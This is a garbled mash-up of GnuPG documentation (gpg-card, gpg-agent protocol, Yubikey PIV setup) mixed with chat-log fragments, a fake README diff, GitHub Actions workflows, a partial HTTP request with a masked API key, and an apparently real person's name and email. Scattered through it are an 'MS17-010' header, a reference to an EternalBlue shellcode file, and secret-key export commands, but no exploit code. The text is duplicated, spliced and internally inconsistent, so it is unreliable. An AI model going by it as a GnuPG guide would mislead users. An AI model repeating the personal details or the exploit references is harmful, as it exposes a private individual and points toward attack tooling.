Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - [verified] - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE722

S: D (rsa (n 326487324683264) (e 10001)))

S OK key created

ISTRUSTED +LISTTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:Ob:81> +GpgAgent returns a list of trusted keys line by line:

S: D 000000001234454556565656677878AF2F1ECCFF P

S: D 340387563485634856435645634856438576457A P

S: D FEDC6532453745367D83474357495743757435D S

S: OK S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1 +--auto-key-import https://www.gnupg.org/documentation/manuals/

9:16 298 signal operators › general INQUIRY <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:Ob:81> +GpgAgent returns a list of trusted keys line by line: + + S: D 000000001234454556565656677878AF2F1ECCFF P

S: D 340387563485634856435645634856438576457A P
S: D FEDC6532453745367D83474357495743757435D S
S: OK S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1 +--auto-key-import https://www.gnupg.org/documentation/manuals/ gnupg/Agent-Options.html#option- _002d_002dhomedir --options file gnupg directory --homedir dir 05 council mainframe Ai Today at 7:54 PM -V --verbose gpgv pgpfile gpgu sigfile [datafile] Message "298 signal operators --verbose gpgv pgpfile gpgv sigfile [datafile] sigfile is the detached signature (either ASCIl- armored or binary) and datafile -stain HOME ~/.gnupg/trustedkeys.grg The default keyring with the allowed keys. gpg(1) -I --interactive debug-level level basic --enable-progress-filter 9 it. --status-fd n n. --status-file file 1 Same as --status-td, except the status data is written to file file. 05 council mainframe Ai Today at 8:02 PM file. Use socket:// --log-time --attribute-file -sig-notation {name=value) I --cert-notation {name=value} -N, --set-notation {name-value} keyname@domain.example.com name Notation are sionatures %k" will be exnanded into Message "298 signal operators general ID of the key making the signature, "%S" into the long key ID of the key making the signature, "⅑g" into the fingerprint of the key making the signature (which might be a subkey), "%p" into the fingerprint of the primary key of the key making the signature, "%c" into the signature count from the OpenPGP smartcard, and "%%" results in a single "%". %k, %K, and %f are only meaningful when making a key signature (certification), and %c is only meaningful when using the OpenPGP smartcard. policy-url 05 council mainframe Ai Today at 8:09 PM string=(|URL) --use-embedded-filename personal-digest-preferences cf. --s2k-mode --no-allow-non-selfsigned-uid 05 council mainframe Ai Today at 8:17 PM --allow-old-cipher-algos --keyring --with-key-data I Print key listings delimited by colons (like --with- colons --list-signatures --list-sigs --list-keys, but the signatures are listed too. This command has the same effect as using --list-keys with --with-sig-list. Note that in contrast to -- check-signatures gpg--list-sigs --with-colons USERID |
Message "298 signal operators
298 signal operators › general --list-keys, but the signatures are listed too. This command has the same effect as using --list-keys with --with-sig-list. Note that in contrast to -- check-signatures gpg--list-sigs--with-colons USERID | \ awk-F: '$1=="sig" &&$2=="?" {if($13){print $13} else{print $5}}' --default-new-key-algo string = algorithm change 05 council mainframe Ai Today at 8:24 PM rsa2048/cert,sign+rsa2048/encr" (or "rsa3072") can be changed to the value of what we currently call future default, which is "ed25519/ cert,sign+cv25519/encr forbid-gen-key allow-secret-key-import --no-expensive-trust-checks --default-keyserver-url name doc/DETAILS --no-encrypt-to 9 Disable the use of all --encrypt-to and --hidden- encrypt-to keys. 05 council mainframe Ai Today at 8:33 PM --armor -a Create PEM encoded output. --with-md5-fingerprint --with-validation with --import --with-key-data --list-keys + Message "298 signal operators diff --git a/ReadMe.md b/ReadMe.md index 7278f80..41b298d 100644 --- a/ReadMe.md +++ b/ReadMe.md @@ -709,7 +709,844 @@ Digital signature’ key gpg-card:

gpg/card> writecert PIV.9C < sign.crt +# MS17-010 +# 000006 +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - [verified] - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Signing key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.co
m> +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.com>
PIV authentication’ key with ssh:
+$ ssh-add -l +384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) +ssh-add with the uppercase ‘-L +$ gpgsm --learn +$ gpg --full-gen-key +Please select what kind of key you want:

(1) RSA and RSA (default)
(2) DSA and Elgamal
(3) DSA (sign only)
(4) RSA (sign only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 3 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y + +GnuPG needs to construct a user ID to identify your key. + +Real name: keith bieszczat +Email address: 6309304695z@gmail.com +Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator +You selected this USER-ID:

"6309304695z@gmail.com"
+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o +gpg: key C3AFA9ED971BB365 marked as ultimately trusted +gpg: revocation certificate stored as '[...]D971BB365.rev' +public and secret key created and signed. + +Note that this key cannot be used for encryption. You may want to use +the command "--edit-key" to generate a subkey for this purpose. +pub rsa2048 2019-04-04 [SC]

 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+uid 6309304695z@gmail.com +

run gpg in --expert mode
$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 +Secret key is available.
+sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+[ultimate] (1). otto@example.net +gpg> addkey +Secret parts of primary key are stored on-card. +Please select what kind of key you want:

(3) DSA (sign only)
(4) RSA (sign only)
(5) Elgamal (encrypt only)
(6) RSA (encrypt only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 4 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y +Really create? (y/N) y + +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+ssb rsa2048/7067860A98FCE6E1

created: 2019-04-04  expires: never       usage: E
card-no: FF020001008A77C1
+[ultimate] (1). otto@example.net + +gpg> save + +/* 32A19-D90712
+LEVEL-5 CLEARANCE ONLY

‘--force’ +authentication key +-header-'010203040506070801020304050607080102030405060708' +SETDATA hexstring +to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command
PKSIGN keyid +where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:
PKSIGN --hash=algoname keyid +READKEY hexified_certid +READCERT hexified_certid|keyid +SERIALNO +Return the serial number of the card using a status response like:
S SERIALNO D27600000000000000000000
WRITEKEY [--force] keyid +SETDATA hexstring +to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command
PKDECRYPT keyid +CHECKPIN idstr +RESTART +APDU [--atr] [--more] [--exlen[=n]] [hexstring] +S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+./configure --sysconfdir=/etc --localstatedir=/va +CN=Wurzel ZS 3,O=Intevation GmbH,C=DE

A6935DD34EF3087973C706FC311AA2CCF733765B S
CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE

DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S
CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE

!14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S
  # Key added on: 2011-07-20 20:38:46
  # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
  34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
+private-keys-v1.d/ +gpg-connect-agent 'help COMMAND' /bye +SETKEY +Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available. +

PKDECRYPT +The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.
S: INQUIRE CIPHERTEXT
C: D (xxxxxx
C: D xxxx)
C: END +Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:
(enc-val
  (<algo>
    (<param_name1> <mpi>)
...
    (<param_namen> <mpi>)))
+Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency. + +If the decryption was successful the decrypted data is returned by means of "D" lines. + +Here is an example session: +

C: PKDECRYPT
S: INQUIRE CIPHERTEXT
C: D (enc-val elg (a 349324324)
C: D (b 3F444677CA)))
C: END
S: # session key follows
S: S PADDING 0
S: D (value 1234567890ABCDEF0)
S: OK decryption successful +The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has +SIGKEY +This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.
SETHASH --hash=| +sig-val
  (<algo>
    (<param_name1> <mpi>)
...
    (<param_namen> <mpi>)))
+The operation is affected by the option +

OPTION use-cache-for-signing=0|1 +The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.
+Here is an example session: +

C: SIGKEY
S: OK key available
C: SIGKEY
S: OK key available
C: PKSIGN
S: # I did ask the user whether he really wants to sign
S: # I did ask the user for the passphrase
S: INQUIRE HASHVAL
C: D ABCDEF012345678901234
C: END
S: # signature follows
S: D (sig-val rsa (s 45435453654612121212))
S: OK
GENKEY [--no-protection] [--preset] [<cache_nonce>] +Invokes the key generation process and the server will then inquire on the generation parameters, like:
S: INQUIRE KEYPARM
C: D (genkey (rsa (nbits 1024)))
C: END +The format of the key parameters which depends on the algorithm is of the form:
(genkey
 (algo
   (parameter_name_1 ....)
     ....
   (parameter_name_n ....)))
+If everything succeeds, the server returns the public key in a SPKI like S-Expression like this: +

(public-key
  (rsa
(n )
(e ))) +Here is an example session:
C: GENKEY
S: INQUIRE KEYPARM
C: D (genkey (rsa (nbits 1024)))
C: END
S: D (public-key
S: D (rsa (n 326487324683264) (e 10001)))
S OK key created
ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> +LISTTRUSTED +GpgAgent returns a list of trusted keys line by line:
S: D 000000001234454556565656677878AF2F1ECCFF P
S: D 340387563485634856435645634856438576457A P
S: D FEDC6532453745367FD83474357495743757435D S
S: OK +The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. +Ok +Finally a client should be able to mark a key as trusted:
MARKTRUSTED fingerprint "P"|"S" +The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:
S: INQUIRE TRUSTDESC
C: D Do you trust the key with the fingerprint @FPR@
C: D bla fasel blurb.
C: END
S: OK +GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]] \
            [--qualitybar] cache_id                \
            [error_message prompt description]
+PRESET_PASSPHRASE [--inquire] <string_or_keygrip> [] + +HAVEKEY keygrips

GET_CONFIRMATION description
LEARN [--send] +UPDATESTARTUPTTY +SETDATA hexstring
PKSIGN keyid
PKSIGN --hash=algoname keyid
+READCERT hexified_certid|keyid +READKEY hexified_certid +SETDATA hexstring +d +

PKSIGN keyid
LEARN
PKSIGN --hash=algoname keyid
+WRITEKEY [--force] keyid +WRITEKEY [--force] keyid +PASSWD [--reset] [--nullpin] chvno +CHECKPIN idstr +APDU [--atr] [--more] [--exlen[=n]] [hexstring] +this: +

S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
+--auto-key-import + +command --locate-external-key +command --locate-external-key +github/workflows/release.yml: +ldap://keys.(thedomain) +‘--auto-key-locate

--auto-key-locate +--auto-key-retrieve
honor-keyserver-url
+-sig-keyserver-url +--recv-key +honor-keyserver-url +--use-agent +--gpg-agent-info + + +--no-random-seed-file +Host: c7-use-3.algolianet. com +Accept: / +Sec-Fetch-Site: cross-site +Accept-Language: en-US, en; q=0.9 +Accept-Encoding: gzip, deflate, br +Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B +Origin: https://dashboard.algolia.com +User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe +x-algolia-api-key: b3cf*************************米** +Content-Length: 27 +Connection: keep-alive +Content-Type: application/x-www-form-urlencoded +Sec-Fetch-Dest: empty + +scdaemon.conf +1 +HKCU\Software\GNU\GnuPG:DefaultLogFile, +--debug-level level +HKCU\Software\GNU\GnuPG:DefaultLogFile, +scd-event +HKCU\Software\GNU\GnuPG:HomeDir +HKCU\Software\GNU\GnuPG:DefaultLogFile, +reader_n.status +HKCU\Software\GNU\GnuPG:HomeDir + +trustlist.txt file +gpg-agent.conf +HKCU\Software\GNU\GnuPG:HomeDir +name: release +debug-pinentry +--debug 1024 + +global trustlist (/usr/local/etc/gnupg/trustlist.tx + +Active cards +Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. +gpg-connect-agent updatestartuptty /bye +Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command: + +gpg-connect-agent /bye +--scdaemon-program filename +Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf +--check-passphrase-pattern file +--check-sym-passphrase-pattern file +Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) +bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe +Keys listed in the sshcontrol file +--disable-extended-key-format +These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched. + +--enable-ssh-support +--enable-win32-openssh-support +--enable-putty-support + +gpg-connect-agent 'GETINFO s2k_count' /bye +gpg-connect-agent 'GETINFO s2k_time' /bye +To view the auto-calibrated count use: + +gpg-connect-agent 'GETINFO s2k_count_cal' /bye +--ssh-fingerprint-digest +Keys listed in the sshcontrol file + +Active card +gpg-connect-agent /bye +bashrc or whatever initialization file is used for all shell invocations: + +GPG_TTY=$(tty) +export GPG_TTY +--daemon [command line] +server + +agent-program file ¶ +Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs. + +--gpg-program file +Specify a non-default gpg binary to be used by certain commands. + +--gpgsm-program file +Specify a non-default gpgsm binary to be used by certain commands. + +--chuid uid +Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows. + +gpg-card +AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ +AUTH +FETCH +GENERATE [--force] [--algo=algo{+algo2}] keyref +KDF-SETUP ¶ +Prepare the OpenPGP card KDF feature for this card. + +LANG [--clear] +Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info. + +LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] +NAME [--clear] +PRIVATEDO [--clear] n [< file] file +READCERT [--openpgp] certref > file ¶ +Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". +URL [--clear] +gpg's. --fetch +WRITECERT certref < file ¶ +WRITECERT --openpgp certref [< file|fpr] +WRITECERT --clear certref

--openpgp +file +fpr. +WRITEKEY [--force] keyref keygrip ¶ +Write a private key object identified by keygrip to the card under the id keyref. +CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ +Serial number +A hex-string with the serial number of the card.
+Type +This gives the type of the card’s application. For example "OpenPGP" or "PIV". + +Keygrip +A hex-string identifying a key. + +Keyref +The application slot where the key is stored on the card. For example "OpenPGP.1" + +Status +The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card. + +YUBIKEY cmd args +Various commands pertaining to Yubikey tokens with cmd being: + +LIST +List supported and enabled Yubikey applications. + +ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] +DISABLE +Enable or disable the specified or all applications on the given interface. + +The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit. + +GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are: + +Authentication key +This is a 24 byte key described by the hex string +010203040506070801020304050607080102030405060708. + +PIV Application PIN +This is the string 123456. + +PIN Unblocking Key +This is the string 12345678. +list (the string gpg/card> +card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: D2760001240102010006090746250000 +Application type .: OpenPGP +Version ..........: 2.1 +[...] +on:

push:
tags:
 - "v*"
+permissions:

contents: write
+jobs:

release:
runs-on: ubuntu-latest
steps:
 - uses: actions/checkout@v3
 - uses: cli/gh-extension-precompile@v1
   with:
     go_version: "1.16"
+Then +- uses: cli/gh-extension-precompile@v1

env:
CGO_ENABLED: 1 +- uses: cli/gh-extension-precompile@v1
with:
build_script_override: "script/build.sh" +name: release
+on:

push:
tags:
 - "v*"
+permissions:

contents: write
+jobs:

release:
runs-on: ubuntu-latest
steps:
 - uses: actions/checkout@v3
 - id: import_gpg
   uses: crazy-max/ghaction-import-gpg@v5
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.GPG_PASSPHRASE }}
 - uses: cli/gh-extension-precompile@v1
   with:
     gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}
+# macOS +gpg --armor --export-secret-key joe@foo.bar | pbcopy + +# Ubuntu (assuming GNU base64) +gpg --armor --export-secret-key joe@foo.bar -w0 | xclip + +# Arch +gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i + +# FreeBSD (assuming BSD base64) +gpg --armor --export-secret-key joe@foo.bar | xclip + +name: import-gpg + +on:

push:
branches: master
+jobs:

import-gpg:
runs-on: ubuntu-latest
steps:
 -
   name: Checkout
   uses: actions/checkout@v4
 -
   name: Import GPG key
   uses: crazy-max/ghaction-import-gpg@v6
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.PASSPHRASE }}
 -
   name: List keys
   run: gpg -K
+name: import-gpg + +on:

push:
branches: master
+gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +jobs:

import-gpg:
runs-on: ubuntu-latest
steps:
 -
   name: Checkout
   uses: actions/checkout@v4
 -
   name: Import GPG key
   uses: crazy-max/ghaction-import-gpg@v6
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.PASSPHRASE }}
     fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8"
 -
   name: List keys
   run: gpg -K
+pub ed25519 2021-09-24 [C]

 87F257B89CE462100BEC0FFE6071D218380FDCC8
 Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092
+uid [ unknown] Joe Bar joe@bar.foo +sub ed25519 2021-09-24 [S]

 C17D11ADF199F12A30A0910F1F80449BE0B08CB8
 Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB
+name: import-gpg +/.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add + +application-priority piv +to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens. + +With one of these methods employed the list command of gpg-card shows this: + +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: [none]

 keyref .....: PIV.9A
+Card authenticat. : [none]

 keyref .....: PIV.9E
+Digital signature : [none]

 keyref .....: PIV.9C
+Key management ...: [none]

 keyref .....: PIV.9D
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key +list --cards +well. The PIV authentication key (internal reference PIV.9A +Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption + +gpg/card> auth 010203040506070801020304050607080102030405060708 +gpg/card> auth < myauth.key + +gpg/card> generate --algo=nistp384 PIV.9A +PIV card no. yk-9074625 detected +gpg/card> generate --algo=nistp256 PIV.9E +PIV card no. yk-9074625 detected +gpg/card> generate --algo=rsa2048 PIV.9C +PIV card no. yk-9074625 detected

‘--force’ +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
+Key management ...: [none]

 keyref .....: PIV.9D
+keygrip +gpg +self-signed X.509 certificate (exit the gpg-card tool, first): + +$ gpgsm --gen-key -o encr.crt

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used:
Key-Type: RSA
Key-Length: 2048
Key-Usage: encrypt
Serial: random
Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpgsm: certificate created +Ready. +$ gpgsm --import encr.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
+Key management ...: [none]

 keyref .....: PIV.9D
+keygrip +gpgsm --gen-key -o encr.crt

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used:
Key-Type: RSA
Key-Length: 2048
Key-Usage: encrypt
Serial: random
Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpgsm: certificate created +Ready. +$ gpgsm --import encr.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +gpgsm --with-keygrip -k 6309304695z@gmail.com +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB

 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.com>
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key + +$ gpgsm --learn +$ gpgsm --gen-key -o sign.crt +Please select what kind of key you want:

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 3 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 +Your selection? 3 +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 2 +Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> 6309304695z@gmail.com +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) +These parameters are used:
Key-Type: card:PIV.9C
Key-Length: 1024
Key-Usage: sign
Serial: random
Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
Name-Email: 6309304695z@gmail.com
+Proceed with creation? (y/N) y +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED +gpgsm: certificate created +Ready. +$ gpgsm --import sign.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +‘gpgsm --learn’ +Digital signature’ key +gpg-card:010203040506070801020304050607080102030405060708 + +shellcode/eternalblue_sc_merge.py + +gpg/card> writecert PIV.9C < sign.crt on: push: branches: master

AUTHENTICATE [--setkey] [--raw] [< file]|key] AUTH and set key

